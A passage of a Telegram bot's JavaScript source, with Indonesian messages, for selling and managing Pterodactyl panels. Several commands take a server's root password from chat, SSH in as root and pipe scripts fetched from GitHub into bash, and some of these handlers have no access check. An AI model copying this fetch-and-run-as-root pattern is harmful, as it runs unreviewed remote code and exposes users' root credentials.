          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

  // ─── /listserver ────────────────────
bot.onText(/\/listserver/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;   
// Check if the user is the Owner
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));
  if (!isPremium) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }
                    ]
                ]
            }
        });
        return;
    }
    let page = 1; // Mengubah penggunaan args[0] yang tidak didefinisikan sebelumnya
    try {
        let f = await fetch(`${domain}/api/application/servers?page=${page}`, { // Menggunakan backticks untuk string literal
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });
        let res = await f.json();
        let servers = res.data;
        let messageText = "Daftar server aktif yang dimiliki:\n\n";
        for (let server of servers) {
            let s = server.attributes;

            let f3 = await fetch(`${domain}/api/client/servers/${s.uuid.split('-')[0]}/resources`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${pltc}`
                }
            });
            let data = await f3.json();
            let status = data.attributes ? data.attributes.current_state : s.status;

            messageText += `ID Server: ${s.id}\n`;
            messageText += `Nama Server: ${s.name}\n`;
            messageText += `Status: ${status}\n\n`;
        }

        bot.sendMessage(chatId, messageText);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
    }
});

  // ─── /listuser ────────────────────
bot.onText(/\/listuser/, async (msg) => {
  const chatId = msg.chat.id;
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }
          ]
        ]
      }
    });
    return;
  }

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`
      }
    });

    const json = await response.json();
    const users = json.data;
    if (!users || users.length === 0) return bot.sendMessage(chatId, "Tidak ada user yang terdaftar di panel.");

    let teks = `📋 *List User Panel:*\n\n`;
    for (let i of users) {
      const { id, username, root_admin, first_name } = i.attributes;
      const adminStatus = root_admin ? "⭐" : "❌";
      teks += `🆔 *${id}* - *${username}*\n👤 ${first_name} ${adminStatus}\n\n`;
    }

    bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "Gagal mengambil data user panel.");
  }
});

  // ─── /installprotect1 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect1 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
     const senderId = msg.from.id;

    // Validasi premium
if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }

    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect1.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect2 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect2 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;
    // Validasi premium
if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }

    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect2 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect2 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect2.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 2...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect3 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect3 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium
if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }
    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect3 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect3 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect3.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 3...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect4 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect4 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium
if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }

    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect4 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect4 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect4.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 4...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect5 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect5 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect5 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect5 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect5.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 5...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect6 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect6 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect6 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect6 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect6.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 6...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect7 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect7 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium

    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect7 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect7 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect7.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 7...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect8 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect8 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect8 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect8 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect8.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 8...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /installprotect9 (versi SSH2) ────────────────────
  bot.onText(/^\/installprotect9 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];
    const senderId = msg.from.id;

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect9 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect9 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/installprotect9.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 9...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *Instalasi selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
// ─── /installprotectall (versi SSH2) ────────────────────
bot.onText(/^\/installprotectall (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const input = match[1];

  // Validasi premium
  if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }

  // Validasi format input
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotectall ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const [ipvps, pwvps] = input.split('|').map(i => i.trim());
  if (!ipvps || !pwvps) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotectall ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const conn = new Client();
  const scripts = [
    'installprotect1.sh',
    'installprotect2.sh',
    'installprotect3.sh',
    'installprotect4.sh',
    'installprotect5.sh',
    'installprotect6.sh',
    'installprotect7.sh',
    'installprotect8.sh',
    'installprotect9.sh'
  ];

  bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 1-9...`, { parse_mode: 'Markdown' });

  conn.on('ready', async () => {
    bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses instalasi semua Protect Panel sedang berjalan...');

    for (let i = 0; i < scripts.length; i++) {
      const scriptURL = `https://raw.githubusercontent.com/yamzzzx/installprotectpanel/main/${scripts[i]}`;
      bot.sendMessage(chatId, `🚀 Memulai instalasi *${scripts[i]}*...`, { parse_mode: 'Markdown' });

      await new Promise((resolve) => {
        conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
          if (err) {
            bot.sendMessage(chatId, `❌ Gagal mengeksekusi ${scripts[i]}:\n\`${err.message}\``, { parse_mode: 'Markdown' });
            return resolve();
          }

          let output = '';

          stream.on('data', (data) => {
            output += data.toString();
          });

          stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
          });

          stream.on('close', () => {
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            bot.sendMessage(chatId, `✅ *${scripts[i]} selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, { parse_mode: 'Markdown' });
            resolve();
          });
        });
      });
    }

    conn.end();
    bot.sendMessage(chatId, '🎉 Semua instalasi Protect Panel 1-9 selesai!', { parse_mode: 'Markdown' });
  });

  conn.on('error', (err) => {
    bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, { parse_mode: 'Markdown' });
  });

  conn.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps
  });
 });
  // ─── /uninstallprotect1 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect1 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect1.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 1 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 1 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect2 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect2 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect2 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect2 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect2.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai uninstall Protect 2 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 2 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect3 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect3 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
